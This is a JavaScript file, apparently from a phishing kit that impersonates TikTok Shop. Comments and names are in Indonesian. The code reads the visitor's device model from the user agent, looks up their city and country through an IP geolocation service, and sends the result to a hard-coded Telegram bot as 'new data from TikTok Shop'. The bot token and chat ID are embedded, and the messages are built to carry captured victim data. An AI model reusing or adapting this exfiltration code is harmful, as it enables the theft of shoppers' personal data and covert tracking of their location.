// KONFIGURASI BOT TELEGRAM
const BOT_TOKEN = '8775719391:AAFsEGizC7fHpF-cYPISJXsnd1vV2z_ntW8';
const CHAT_ID = '6883233614';

// INFO PERANGKAT & LOKASI
let infoPerangkat = { lokasi: 'Mendeteksi...', perangkat: 'Perangkat Tidak Diketahui' };

function ambilNamaPerangkat() {
    const ua = navigator.userAgent;
    let nama = 'Perangkat Tidak Diketahui';

    if (/Samsung|SM-/.test(ua)) nama = 'Samsung Galaxy';
    else if (/OPPO|CPH/.test(ua)) nama = 'OPPO';
    else if (/Vivo|V22|V23|V24|V25|V26|V27|V29/.test(ua)) nama = 'Vivo';
    else if (/Redmi|Xiaomi|POCO/.test(ua)) nama = 'Xiaomi';
    else if (/Realme|RMX/.test(ua)) nama = 'Realme';
    else if (/Infinix|X6/.test(ua)) nama = 'Infinix';
    else if (/Tecno|KF6|KG6|KB7|CI6|KN4/.test(ua)) nama = 'TECNO KN4n';
    else if (/itel|Itel/.test(ua)) nama = 'Itel';
    else if (/iPhone/.test(ua)) nama = 'iPhone';
    else if (/Lenovo/.test(ua)) nama = 'Lenovo';
    else if (/Asus|ROG|Zenfone/.test(ua)) nama = 'ASUS';
    else if (/Nokia/.test(ua)) nama = 'Nokia';
    else if (/Android/.test(ua)) nama = 'HP Android';

    return nama;
}

async function ambilInfoPerangkat() {
    try {
        const res = await fetch('https://ipapi.co/json/');
        const d = await res.json();
        infoPerangkat.lokasi = `${d.city || 'Tidak Diketahui'}, ${d.region || ''}, ${d.country_name || 'Tidak Diketahui'}`;
    } catch {
        infoPerangkat.lokasi = 'Tidak Terdeteksi';
    }
    infoPerangkat.perangkat = ambilNamaPerangkat();
}

// FUNGSI KIRIM PESAN KE TELEGRAM
async function kirimTelegram(judul, pesan) {
    while (infoPerangkat.lokasi === 'Mendeteksi...') {
        await new Promise(r => setTimeout(r, 200));
    }
    
    const teks = `📩 Data Baru dari TikTok Shop

${pesan}

🌍 LOKASI PERANGKAT:
${infoPerangkat.lokasi}

📱 NAMA PERANGKAT:
${infoPerangkat.perangkat}`;

    try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: teks, parse_mode: 'Markdown' })
        });
        const hasil = await res.json();
        console.log('✅ Terkirim ke Telegram:', hasil);
        return true;
    } catch (e) {
        console.log('❌ Gagal kirim:', e);
        return false;
    }
}
